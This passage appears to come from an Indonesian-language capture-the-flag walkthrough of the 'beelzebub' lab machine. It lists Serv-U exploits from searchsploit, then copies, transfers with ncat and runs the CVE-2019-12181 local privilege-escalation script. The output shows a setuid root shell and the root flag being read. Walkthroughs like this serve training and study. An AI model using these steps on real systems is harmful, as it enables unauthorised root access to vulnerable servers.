Serv-U FTP Server 11.1.0.3 - Denial of Service / Security Bypass              | windows/dos/36405.txt
Serv-U FTP Server 7.3 - (Authenticated) Remote FTP File Replacement           | windows/remote/6661.txt
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)                   | linux/local/47009.c
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)                   | multiple/local/47173.sh
Serv-U Web Client 9.0.0.5 - Remote Buffer Overflow (1)                        | windows/remote/9966.txt
Serv-U Web Client 9.0.0.5 - Remote Buffer Overflow (2)                        | windows/remote/9800.cpp
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```
lalu saya ambil, dan upload ke `victim machine`.
```
╭─ via [vh/beelzebub]
╰─ searchsploit -m multiple/local/47173.sh                   
  Exploit: Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)
      URL: https://www.exploit-db.com/exploits/47173
     Path: /usr/share/exploitdb/exploits/multiple/local/47173.sh
    Codes: CVE-2019-12181
 Verified: False
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /home/via/ctfs/vh/beelzebub/47173.sh
```
kirim menggunakan ncat, lalu eksekusi.
```
krampus@beelzebub:/dev/shm$ ./*sh
[*] Launching Serv-U ...
sh: 1: : Permission denied
[+] Success:
-rwsr-xr-x 1 root root 1113504 Nov 26 15:01 /tmp/sh
[*] Launching root shell: /tmp/sh
sh-4.4# id
uid=1000(krampus) gid=1000(krampus) euid=0(root) groups=1000(krampus),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
sh-4.4# cat root.txt
8955qpasq8qq807879p75e1rr24cr1a5
```
